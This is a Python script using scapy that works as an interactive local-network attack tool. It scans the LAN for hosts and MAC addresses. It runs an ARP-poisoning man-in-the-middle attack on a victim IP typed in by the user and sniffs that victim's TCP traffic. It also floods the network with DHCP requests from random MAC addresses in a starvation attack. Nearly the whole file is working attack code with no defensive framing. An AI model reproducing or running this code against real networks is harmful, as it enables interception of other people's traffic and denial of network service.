from scapy.all import *
import os
import signal
import sys
import threading
import time
import subprocess
import socket

self_ip = str(subprocess.check_output("ipconfig getifaddr en0", shell=True))[2:-3]
lan = self_ip.split(".")
lan = lan[0] + "." + lan[1] + "." + lan[2]
nmap_broadcast = lan + ".1/24"
gateway_ip = ""
gateway_mac = ""
packet_count = 1000
hosts = dict()
online_hosts = dict()

def get_online_hosts_with_mac():
	print("finding all the hosts with mac addresses in the lan")
	global nmap_broadcast
	subprocess.check_output("nmap -sP " + nmap_broadcast, shell=True)
	arp_result = subprocess.check_output("arp -a", shell=True)
	if arp_result == "":
		print("no online hosts were find or internet connection is lost")
		return
	arp_result = arp_result.decode().split('\n')
	del arp_result[-1]
	for host in arp_result:
		host = host.split(" ")
		if host[3] == "(incomplete)":
			continue
		global hosts
		hosts[host[1][1:-1]] = host[3]
	global gateway_ip
	gateway_ip = list(hosts.keys())[0]
	global gateway_mac
	gateway_mac = list(hosts.values())[0]

def get_online_hosts():
	print("finding all the hosts with mac addresses in the lan")
	global nmap_broadcast
	subprocess.check_output("nmap -sP " + nmap_broadcast, shell=True)
	arp_result = subprocess.check_output("arp -a", shell=True)
	if arp_result == "":
		print("no online hosts were find or internet connection is lost")
		return
	arp_result = arp_result.decode().split('\n')
	del arp_result[-1]
	global online_hosts
	for host in arp_result:
		host = host.split(" ")
		online_hosts[host[1][1:-1]] = host[3]
	

def arp_poison(target_ip):
	global gateway_mac, gateway_ip
	if gateway_ip == "" or gateway_mac == "":
		get_online_hosts_with_mac()
	print("starting the mitm attack")
	try:
		while True:
			send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
			send(ARP(op=2, pdst=target_ip, hwdst=hosts[target_ip], psrc=gateway_ip), verbose=False)
			time.sleep(2)
	except Exception as e:
		print(e)

def mitm_callback(pkt):
	try:
		#if pkt[0].type == 2054:
		#	pass
		if not pkt[0][1].dst == self_ip and not pkt[0][1].dst == self_ip:
			pkt.show()
			print(socket.gethostbyaddr(pkt[0][1].dst))
	except Exception as e:
		pass

	
	"""
	ret = pkt[0][1].src + " - " + pkt[0][1].dst + "\n"
	if hasattr(pkt[0][2], "load"):
		try:
			ret =  ret + pkt[0][2].load.decode()
		except Exception as e:
			print(e)
	return ret
	"""

def starvation_attack():
	conf.checkIPaddr = False
	dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
	#sendp(dhcp_discover,loop=1)
	#print(dhcp_discover)
	while True:
		dhcp_request =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","request"),"end"])
		#print(dhcp_request)
		sendp(dhcp_request)
		time.sleep(2)

def starvation_callback(pkt):
	pkt.show()

while 1:
	print("select from below options")
	print("1 get online hosts with mac addresses")
	print("2 mitm")
	print("3 dos")
	print("4 starvation attack")
	print("5 get all the hosts")
	option = input()
	if option == "1":
		get_online_hosts_with_mac()
		for key, value in hosts.items():
			if key == gateway_ip and value == gateway_mac:
				print(key + " at " + value + " as gateway")
				continue
			print(key + " at " + value)
		print()
	elif option == "2":
		print("enter the ip of the victim")
		target_ip = input()
		if target_ip == self_ip:
			print("cannot attack yourself")
			print()
			continue
		else:
			poison_thread = threading.Thread(target=arp_poison, args=(target_ip,))
			poison_thread.start()
			sniff_filter = "ip host " + target_ip
			print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
			#packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
			packets = sniff(iface="en0", prn=mitm_callback, filter="tcp", store=0)
			wrpcap(target_ip + "_capture.pcap", packets)
	elif option == "3":
		continue
	elif option == "4":
		print("starvation attack starting")
		starvation_thread = threading.Thread(target=starvation_attack)
		starvation_thread.start()
		packets = sniff(iface="en0", prn=starvation_callback, filter="udp", store=0)
	if option == "5":
		get_online_hosts()
		for key, value in online_hosts.items():
			print(key + " at " + value)
		print()




